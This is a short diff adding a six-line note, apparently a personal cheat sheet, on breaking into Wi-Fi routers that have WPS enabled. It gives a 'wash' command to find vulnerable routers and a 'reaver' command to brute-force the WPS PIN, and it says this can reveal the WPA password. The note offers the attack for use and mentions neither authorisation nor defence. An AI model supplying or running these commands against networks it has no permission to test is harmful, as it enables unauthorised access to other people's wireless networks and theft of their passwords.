@@ -1,0 +1,6 @@
+1. Scan for WPS-enabled Routers
+wash -i wlan0mon
+2. Attack with Reaver
+reaver -i wlan0mon -b <BSSID> -c <CH> -vv
+Takes time but can reveal WPA password if router is vulnerable
+
